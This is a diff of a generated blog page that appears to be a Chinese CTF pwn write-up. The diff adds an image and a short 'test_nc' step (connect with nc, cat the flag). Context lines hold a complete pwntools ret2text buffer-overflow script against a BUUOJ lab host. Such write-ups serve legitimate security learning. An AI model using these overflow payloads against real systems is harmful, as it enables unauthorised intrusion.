@@ -18,8 +18,9 @@
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_17-42-47.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_18-15-09.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_18-17-10.png">
+<meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-30-58.png">
 <meta property="article:published_time" content="2023-01-15T09:40:19.000Z">
-<meta property="article:modified_time" content="2023-01-15T10:25:01.854Z">
+<meta property="article:modified_time" content="2023-01-15T11:31:58.855Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_17-42-47.png">
@@ -212,6 +213,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29344</span>)</span><br><span class="line">s=<span class="number">0x401186</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">15</span>+p64(s)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>之后kali运行，轻松得到flag</p>
+<h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>nc，然后cat得到flag<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-30-58.png" style="zoom:33%;"></p>
 
       
 
